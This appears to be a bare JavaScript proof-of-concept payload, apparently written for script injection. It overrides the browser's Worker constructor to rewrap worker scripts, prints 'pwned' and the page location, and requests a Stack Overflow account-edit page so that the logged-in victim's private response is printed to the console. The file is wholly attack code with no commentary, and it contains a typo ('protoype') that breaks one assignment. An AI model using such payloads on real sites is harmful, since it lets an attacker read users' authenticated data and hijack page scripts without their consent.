const workerInject = function(scriptUrl) {
    importScripts(scriptUrl);
};
const OriginalWorker = Worker;
Worker = function() {
	    arguments[0] = URL.createObjectURL(new Blob([`(${workerInject.toString()})('${arguments[0].replaceAll(/['\\]/g, '\\$&')}');`]));
    return Reflect.construct(OriginalWorker, arguments);
};
Worker.protoype = OriginalWorker.prototype;
Worker.prototype.constructor = Worker;


console.log("pwned");
console.log(location)

function reqListener () {
	  console.log(this.responseText);
}

var oReq = new XMLHttpRequest();
oReq.addEventListener("load", reqListener);
oReq.open("GET", "https://stackoverflow.com/users/edit/14781778");
oReq.send();
